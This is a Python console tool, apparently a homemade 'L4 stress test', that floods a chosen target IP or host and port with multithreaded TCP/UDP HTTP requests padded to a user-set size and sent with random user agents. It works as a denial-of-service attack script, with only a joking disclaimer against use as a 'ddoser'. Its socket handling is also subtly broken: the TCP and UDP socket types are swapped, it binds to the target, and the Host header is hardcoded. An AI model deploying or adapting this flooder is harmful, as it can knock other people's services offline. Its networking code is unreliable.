import urllib.request
from modules.data import Variables
from random import choice,randint
from threading import Thread
from time import sleep
import socket

def wait():
	input()
	print("[i] Stopping threads please wait...")
	Variables.stopping_threads=True
	while Variables.stopped_threads>7:
		pass
	print("[i] Stopped!")
def send():
	packet = (f"GET /{Variables.target} HTTP/1.1\r\nHost: 8.8.8.8\r\n User-Agent: {choice(Variables.user_agents)}\r\nConnection: Keep-Alive\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\n{Variables.message}\r\n\r\n").encode("utf-8")
	if Variables.socket_method == "udp":
		mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	else:
		mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	while not Variables.stopping_threads:
		try:
			if Variables.socket_method == "tcp":
				mysocket.connect((Variables.target, Variables.port))
			else:
				try:
					mysocket.bind((Variables.target, Variables.port))
				except Exception as e:
					print(f"[!] Failed to bind {e}"+str(type(Variables.target))+" "+str(type(Variables.port)))
					pass
			if Variables.socket_method == "tcp":
				mysocket.send(packet)
			try:
				mysocket.sendto(packet, (Variables.target, Variables.port))
			except Exception:
				mysocket.send(packet)
		except socket.error as ex:
			print(f"[!] Socket error {ex}")
			if Variables.socket_method == "tcp":
				try:
					mysocket.close()
					th = Variables.threads-(Variables.stopped_threads+1)
					print(f"[i] Breaking out. Threads left: {th}")
					break
				except Exception:
					pass
			else:
				th = Variables.threads-(Variables.stopped_threads+1)
				print(f"[i] Breaking out. Threads left: {th}")
				break
	Variables.stopped_threads += 1




def parse(inp_=""):
	if inp_.count(" ")>0:
		ar = inp_.split(" ")
		if len(ar)<=1:
			print("[!] Command not found")
			return
		
		command = ar[0]
		args = ar[1:]

		if command.startswith("target"):
			Variables.target=args[0]
			print("[i] Target set!")
		elif command.startswith("threads"):
			try:
				Variables.threads = int(args[0])
				print("[i] Thread number set!")
			except:
				print("[!] Enter a valid number")
			
		elif command.startswith("method"):
			if not (args[0]=="udp" or args[0]=="tcp"):
				print("[!] Enter a valid socket method! udp/tcp")
			else:
				Variables.socket_method=args[0]
				print("[i] Socket method set!")

		elif command.startswith("port"):
			try:
				Variables.port = int(args[0])
				print("[i] Socket port set!")
			except:
				print("[!] Enter a valid number")
		elif command.startswith("mb"):
			try:
				Variables.message = "r"*int(int(args[0])/0.0001)
				print("[i] Packet size set!")
			except:
				print("[!] Enter a valid number")
		elif command.startswith("save"):
			if Variables.save(args[0]):
				print("[i] Saved!")
			else:
				print("[!] Unable to save!")
		elif command.startswith("load"):
			if Variables.load(args[0]):
				print("[i] Loaded!")
			else:
				print("[!] Unable to load!")
	else:
		if inp_.startswith("run"):
			if Variables.target != "":
				Variables.stopping_threads=False
				Variables.stopped_threads=0
				try:
					w = Thread(target=wait)
					w.start()
				except:
					print("[!] Stop thread failed to start!")
					exit()
				
				print("[i] Starting threads...")

				for i in range(Variables.threads):
					try:
						t = Thread(target=send)
						t.start()
					except:
						print(f"[!] Could not start thread {i}")
				print("[i] Started! Use ENTER or Ctrl+C to stop")
			else:
				print("[!] Target not set!")
		elif inp_.startswith("save"):
			if Variables.save():
				print("[i] Quicksaved!")
			else:
				print("[!] Unable to quicksave!")
		elif inp_.startswith("load"):
			if Variables.load():
				print("[i] Quickloaded!")
			else:
				print("[!] Unable to quickload!")
		elif inp_.startswith("lookup"):
			print(f"Target : {Variables.target}\nThreads : {Variables.threads}\nPort : {Variables.port}\nMethod : {Variables.socket_method}")
		elif inp_.startswith("help"):
			print("------------------------------------------------------------")
			print("run - runs stress test")
			print("exit - exits")
			print("save (optional)filename - saves current config")
			print("load (optional)filename - loads current config")
			print("target <target ip/www> - sets target")
			print("threads <number> - sets the amount of threads. Default 400")
			print("method <tcp/udp> - sets socket method")
			print("mb - sets socket data amount in mb")
			print("port - sets socket port")
			print("lookup - check config")
			print("------------------------------------------------------------")


		elif inp_.startswith("exit"):
			print("[i] Exiting...")
			Variables.stopping_threads=True
			exit()

def main():
	print("[i] L4 stress TEST")
	print("[i] do NOT use this pile of crap as a ddoser plz")
	print("[i] by ja")
	while 1:
		inp = input("L4>").lower()
		parse(inp)


main()